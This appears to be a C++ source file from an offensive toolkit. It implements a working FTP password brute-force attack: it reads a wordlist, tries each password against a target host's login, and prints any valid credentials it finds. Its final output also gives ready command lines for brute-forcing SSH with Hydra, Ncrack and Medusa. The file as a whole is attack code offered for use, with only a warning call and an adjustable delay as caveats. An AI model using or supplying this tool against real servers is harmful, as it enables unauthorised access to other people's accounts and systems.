#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <thread>
#include <sstream>
#include "online_attacks.hpp"

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #define closesocket close
#endif

using namespace std;
using namespace std::chrono;

extern void printWarning();
extern bool initializeSockets();
extern void cleanupSockets();

string receiveResponse(int sock) {
    char buffer[1024] = {0};
    int bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (bytesRead > 0) {
        return string(buffer, bytesRead);
    }
    return "";
}

bool sendFTPCommand(int sock, const string& command) {
    string cmd = command + "\r\n";
    return send(sock, cmd.c_str(), cmd.length(), 0) > 0;
}

bool testFTPLogin(const string& host, int port, const string& username,
                  const string& password) {

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;

    struct sockaddr_in server;
    struct hostent* he = gethostbyname(host.c_str());

    if (he == NULL) {
        closesocket(sock);
        return false;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr = *((struct in_addr*)he->h_addr);

    // Set timeout
    struct timeval timeout;
    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(sock);
        return false;
    }

    // Read welcome banner
    string response = receiveResponse(sock);
    if (response.find("220") == string::npos) {
        closesocket(sock);
        return false;
    }

    // Send USER command
    sendFTPCommand(sock, "USER " + username);
    response = receiveResponse(sock);

    // Send PASS command
    sendFTPCommand(sock, "PASS " + password);
    response = receiveResponse(sock);

    // Check for successful login (230) or failure (530)
    bool success = (response.find("230") != string::npos);

    // Send QUIT
    sendFTPCommand(sock, "QUIT");

    closesocket(sock);
    return success;
}

void runFTPBruteForce(const string& host, int port, const string& username,
                      const string& wordlist, int delayMs) {

    printWarning();

    if (!initializeSockets()) {
        cerr << "[!] Failed to initialize sockets\n";
        return;
    }

    ifstream dictFile(wordlist);
    if (!dictFile.is_open()) {
        cerr << "[!] Failed to open wordlist: " << wordlist << endl;
        cleanupSockets();
        return;
    }

    cout << "\n[+] Starting FTP Brute Force Attack\n";
    cout << "[+] Target: " << host << ":" << port << "\n";
    cout << "[+] Username: " << username << "\n";
    cout << "[+] Delay: " << delayMs << "ms (rate limiting enabled)\n";
    cout << "[!] Note: Many FTP servers have built-in rate limiting\n";
    cout << "[!] Excessive attempts may trigger IP bans\n\n";

    long long attempts = 0;
    bool found = false;
    string password;

    auto start = high_resolution_clock::now();

    while (getline(dictFile, password) && !found) {
        attempts++;

        cout << "[" << attempts << "] Testing: " << username << " : " << password << "...";
        cout.flush();

        if (testFTPLogin(host, port, username, password)) {
            found = true;
            cout << " SUCCESS!\n";
            cout << "\n[!] Valid FTP credentials found!\n";
            cout << "[!] Host: " << host << ":" << port << "\n";
            cout << "[!] Username: " << username << "\n";
            cout << "[!] Password: " << password << "\n";
            cout << "[!] Attempts: " << attempts << "\n";
        } else {
            cout << " Failed\n";
        }

        // Rate limiting
        this_thread::sleep_for(milliseconds(delayMs));
    }

    dictFile.close();

    auto end = high_resolution_clock::now();
    auto duration = duration_cast<seconds>(end - start);

    if (!found) {
        cout << "\n[!] No valid credentials found\n";
    }

    cout << "[!] Total attempts: " << attempts << "\n";
    cout << "[!] Time taken: " << duration.count() << " seconds\n";

    cout << "\n[*] Note: For SSH brute force, consider using:\n";
    cout << "    - Hydra: hydra -l user -P wordlist.txt ssh://target\n";
    cout << "    - Ncrack: ncrack -U users.txt -P passwords.txt ssh://target\n";
    cout << "    - Medusa: medusa -h target -u user -P wordlist.txt -M ssh\n";
    cout << "\n[*] Native SSH implementation requires libssh2 library.\n";
    cout << "    This basic version demonstrates the concept with FTP.\n";

    cleanupSockets();
}
